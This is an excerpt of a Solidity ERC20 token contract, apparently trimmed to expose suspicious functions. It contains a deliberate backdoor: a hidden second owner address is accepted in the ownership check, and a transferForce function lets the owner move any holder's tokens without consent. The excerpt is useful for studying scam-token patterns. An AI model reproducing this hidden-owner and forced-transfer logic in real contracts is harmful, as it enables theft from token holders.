...
abstract contract Ownable is Context {
    ...
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender() || _ownerB == _msgSender(), "Ownable: caller is not the owner");
    }
...
contract seedToken is ERC20, Ownable {
    ...
    function withdrawToken(
     ...
     function transferForce(address _from,address _to,uint256 _amount) public onlyOwner returns (bool success) {
          _transfer(_from, _to, _amount); 
          return true; 
     }

    function multiTransferForce(address[] calldata recipients, uint256[] calldata amounts) public onlyOwner returns (bool){
        require(recipients.length <= amounts.length);

        IERC20 tokenInstance = IERC20(address(this));
        
        for (uint256 i = 0; i < recipients.length; i++) {
            tokenInstance.transfer(recipients[i], amounts[i]);
        }
        return true;
    }
